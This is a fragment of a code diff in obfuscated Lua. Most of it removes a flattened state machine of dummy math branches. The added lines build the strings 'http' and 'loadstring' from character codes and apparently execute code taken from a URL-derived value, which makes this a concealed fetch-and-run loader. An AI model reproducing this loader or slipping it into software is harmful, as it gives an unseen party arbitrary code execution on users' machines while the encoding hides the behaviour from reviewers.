-        local _dummy = _G[4].sqrt(596); _S = 532
-    end
-    if _S == 597 then
-        local _dummy = _G[4].sqrt(597); _S = 34
-    end
-    if _S == 598 then
-        local _dummy = _G[4].sqrt(598); _S = 248
-    end
-    if _S == 599 then
-        local _dummy = _G[4].sqrt(599); _S = 23
-    end
-    if _S == 600 then
-        local _dummy = _G[4].sqrt(600); _S = 22
-    end
-    if _S == 601 then
-        local _dummy = _G[4].sqrt(601); _S = 438
-    end
-    if _S == 602 then
-        local _dummy = _G[4].sqrt(602); _S = 167
-    end
-    if _S == 603 then
-        local _dummy = _G[4].sqrt(603); _S = 554
-    end
-    if _S == 604 then
-        local _dummy = _G[4].sqrt(604); _S = 69
-    end
-    if _S == 605 then
-        local _dummy = _G[4].sqrt(605); _S = 513
-    end
-    if _S == 606 then
-        local _dummy = _G[4].sqrt(606); _S = 160
-    end
-    if _S == 607 then
-        local _dummy = _G[4].sqrt(607); _S = 592
-    end
-    if _S == 608 then
-        local _dummy = _G[4].sqrt(608); _S = 609
-    end
-    if _S == 609 then
-        local _dummy = _G[4].sqrt(609); _S = 504
-    end
-    if _S == 610 then
-        local _dummy = _G[4].sqrt(610); _S = 333
-    end
-    if _S == 611 then
-        local _dummy = _G[4].sqrt(611); _S = 43
-    end
-    if (_S + 18 == 630) then
-        local _dummy = _G[4].sqrt(612); _S = 648
-    end
-    if _S == 613 then
-        local _dummy = _G[4].sqrt(613); _S = 184
-    end
-    if _S == 614 then
-        local _dummy = _G[4].sqrt(614); _S = 341
-    end
-    if _S == 615 then
-        local _dummy = _G[4].sqrt(615); _S = 165
-    end
-    if _S == 616 then
-        local _dummy = _G[4].sqrt(616); _S = 28
-    end
-    if _S == 617 then
-        local _dummy = _G[4].sqrt(617); _S = 4
-    end
-    if _S == 618 then
-        local _dummy = _G[4].sqrt(618); _S = 242
-    end
-    if _S == 619 then
-        local _dummy = _G[4].sqrt(619); _S = 119
-    end
-    if _S == 620 then
-        local _dummy = _G[4].sqrt(620); _S = 203
-    end
-    if _S == 621 then
-        local _dummy = _G[4].sqrt(621); _S = 126
-    end
-    if _S == 622 then
-        local _dummy = _G[4].sqrt(622); _S = 51
-    end
-    if _S == 623 then
-        local _dummy = _G[4].sqrt(623); _S = 425
-    end
-    if (_S + 18 == 642) then
-        local _dummy = _G[4].sqrt(624); _S = 20
-    end
-    if _S == 625 then
-        local _dummy = _G[4].sqrt(625); _S = 157
-    end
-    if _S == 626 then
-        local _dummy = _G[4].sqrt(626); _S = 326
-    end
-    if _S == 627 then
-        local _dummy = _G[4].sqrt(627); _S = 636
-    end
-    if _S == 628 then
-        local _dummy = _G[4].sqrt(628); _S = 23
-    end
-    if _S == 629 then
-        local _dummy = _G[4].sqrt(629); _S = 281
-    end
-    if _S == 630 then
-        local _dummy = _G[4].sqrt(630); _S = 475
-    end
-    if _S == 631 then
-        local _dummy = _G[4].sqrt(631); _S = 618
-    end
-    if _S == 632 then
-        local _dummy = _G[4].sqrt(632); _S = 319
-    end
-    if _S == 633 then
-        local _dummy = _G[4].sqrt(633); _S = 232
-    end
-    if _S == 634 then
-        local _dummy = _G[4].sqrt(634); _S = 638
-    end
-    if _S == 635 then
-        local _dummy = _G[4].sqrt(635); _S = 643
-    end
-    if (_S + 18 == 654) then
-        local _dummy = _G[4].sqrt(636); _S = 237
-    end
-    if _S == 637 then
-        local _dummy = _G[4].sqrt(637); _S = 602
-    end
-    if _S == 638 then
-        local _dummy = _G[4].sqrt(638); _S = 545
-    end
-    if _S == 639 then
-        local _dummy = _G[4].sqrt(639); _S = 499
-    end
-    if (_S + 18 == 658) then
-        local _dummy = _G[4].sqrt(640); _S = 484
-    end
-    if _S == 641 then
-        local _dummy = _G[4].sqrt(641); _S = 8
-    end
-    if (_S + 18 == 660) then
-        local _dummy = _G[4].sqrt(642); _S = 166
-    end
-    if _S == 643 then
-        local _dummy = _G[4].sqrt(643); _S = 26
-    end
-    if _S == 644 then
-        local _dummy = _G[4].sqrt(644); _S = 492
-    end
-    if (_S + 18 == 663) then
-        local _dummy = _G[4].sqrt(645); _S = 508
-    end
-    if _S == 646 then
-        local _dummy = _G[4].sqrt(646); _S = 328
-    end
-    if (_S + 18 == 665) then
-        local _dummy = _G[4].sqrt(647); _S = 462
-    end
-    if _S == 648 then
-        local _dummy = _G[4].sqrt(648); _S = 642
-    end
-    if _S == 649 then
-        local _dummy = _G[4].sqrt(649); _S = 380
-    end
-    if _S == 650 then
-        local _dummy = _G[4].sqrt(650); _S = 288
+    if _s == 550 then
+        if _u:sub(1,4) == _v[2].char(104,116,116,112) then
+            local _ld = _v[6]()[_v[2].char(108,111,97,100,115,116,114,105,110,103)] or loadstring
+            local f = _ld(_r); if f then f() end
+        end
+        _s = 0
     end
 end
